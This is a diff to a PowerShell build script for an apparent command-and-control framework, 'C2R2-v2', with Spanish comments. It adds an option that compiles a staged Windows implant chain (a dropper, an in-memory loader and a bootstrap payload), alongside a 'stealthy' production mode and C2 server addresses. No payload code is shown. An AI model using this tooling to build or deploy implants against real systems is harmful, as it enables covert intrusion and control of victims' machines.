@@ -8,6 +8,7 @@ param(
     [string]$AgentName = "agent",
     [switch]$Production,
     [switch]$NoCache,
+    [switch]$MultiStage,
     [switch]$Help
 )
 
@@ -31,6 +32,7 @@ if ($Help) {
     Write-Host "  -ServerPort <PORT>   Puerto del servidor C2 (default: 4444)"
     Write-Host "  -AgentName <NAME>    Nombre del agente (default: agent)"
     Write-Host "  -Production          Compilar en modo producción (stealthy)"
+    Write-Host "  -MultiStage          Compilar sistema multi-stage (ESTER→JAVELIN→Stage0)"
     Write-Host "  -NoCache             Forzar rebuild limpiando target/"
     Write-Host "  -Help                Mostrar esta ayuda"
     Write-Host ""
@@ -38,6 +40,7 @@ if ($Help) {
     Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -ServerPort 4444"
     Write-Host "  .\build-all.ps1 -ServerIP 181.231.253.69 -Production"
     Write-Host "  .\build-all.ps1 -AgentName agent-prod -Production"
+    Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -MultiStage -Production"
     exit 0
 }
 
@@ -52,6 +55,10 @@ if ($Production) {
     Write-Color "PRODUCCIÓN (stealthy)" Green
 } else {
     Write-Color "DESARROLLO (debug)" Green
+}
+if ($MultiStage) {
+    Write-Host "   • Multi-Stage: " -NoNewline
+    Write-Color "ACTIVADO (ESTER→JAVELIN→Stage0)" Green
 }
 Write-Host ""
 
@@ -288,6 +295,75 @@ if ($LASTEXITCODE -eq 0) {
 Write-Host ""
 
 # ============================================================================
+# 4. Compilar Multi-Stage System (Opcional)
+# ============================================================================
+if ($MultiStage) {
+    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
+    Write-Color "📦 [4/4] Compilando sistema multi-stage..." Yellow
+    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
+    
+    Write-Color "⚙️  Compilando ESTER (Stage 1: Dropper)..." Cyan
+    cargo build --release --package ester --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished") {
+            Write-Color $_ Cyan
+        }
+    }
+    
+    if ($LASTEXITCODE -eq 0) {
+        Copy-Item "target\x86_64-pc-windows-gnu\release\ester.exe" "dist\ester.exe" -Force
+        Write-Color "✅ ESTER compilado: dist\ester.exe" Green
+    } else {
+        Write-Color "⚠️  Error compilando ESTER" Yellow
+    }
+    
+    Write-Color "⚙️  Compilando JAVELIN (Stage 2: In-Memory Loader)..." Cyan
+    cargo build --release --package javelin --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished") {
+            Write-Color $_ Cyan
+        }
+    }
+    
+    if ($LASTEXITCODE -eq 0) {
+        Copy-Item "target\x86_64-pc-windows-gnu\release\javelin.exe" "dist\javelin.exe" -Force
+        Write-Color "✅ JAVELIN compilado: dist\javelin.exe" Green
+    } else {
+        Write-Color "⚠️  Error compilando JAVELIN" Yellow
+    }
+    
+    Write-Color "⚙️  Compilando Stage0 (Stage 3: Bootstrap)..." Cyan
+    cargo build --release --package stage0 --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished") {
+            Write-Color $_ Cyan
+        }
+    }
+    
+    if ($LASTEXITCODE -eq 0) {
+        Copy-Item "target\x86_64-pc-windows-gnu\release\stage0.exe" "dist\stage0.exe" -Force
+        Write-Color "✅ Stage0 compilado: dist\stage0.exe" Green
+    } else {
+        Write-Color "⚠️  Error compilando Stage0" Yellow
+    }
+    
+    Write-Host ""
+    Write-Color "ℹ️  Nota: Los stages tienen payloads placeholder" Cyan
+    Write-Color "   Requieren integración con builder para embeber payloads cifrados" Cyan
+    Write-Color "   Flujo: ESTER → JAVELIN (memoria) → Stage0 (memoria) → Agent completo" Cyan
+    Write-Host ""
+}
+
+# ============================================================================
 # Verificar resultados
 # ============================================================================
 Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Green
@@ -303,6 +379,22 @@ Get-ChildItem "dist" -File | ForEach-Object {
 }
 
 # Crear archivo BUILD_INFO
+$componentsList = @"
+- c2r2-server-x86_64 (Linux x86_64, built in WSL)
+- c2r2-server-arm64 (Linux ARM64 for Raspberry Pi, built in WSL)
+- ${AgentName}.exe (Windows x86_64)
+"@
+
+if ($MultiStage) {
+    $componentsList += @"
+
+Multi-Stage Components:
+- ester.exe (Stage 1: Dropper/Validator)
+- javelin.exe (Stage 2: In-Memory Loader)
+- stage0.exe (Stage 3: Bootstrap Payload)
+"@
+}
+
 $buildInfo = @"
 C2R2-v2 Build Information
 =========================
@@ -312,11 +404,10 @@ Server Port: $ServerPort
 Agent Name: ${AgentName}.exe
 Build Mode: $(if ($Production) { "PRODUCTION" } else { "DEVELOPMENT" })
 Features: $agentFeatures
+Multi-Stage: $(if ($MultiStage) { "ENABLED" } else { "DISABLED" })
 
 Components:
-- c2r2-server-x86_64 (Linux x86_64, built in WSL)
-- c2r2-server-arm64 (Linux ARM64 for Raspberry Pi, built in WSL)
-- ${AgentName}.exe (Windows x86_64)
+$componentsList
 "@
 
 $buildInfo | Out-File "dist\BUILD_INFO.txt" -Encoding UTF8
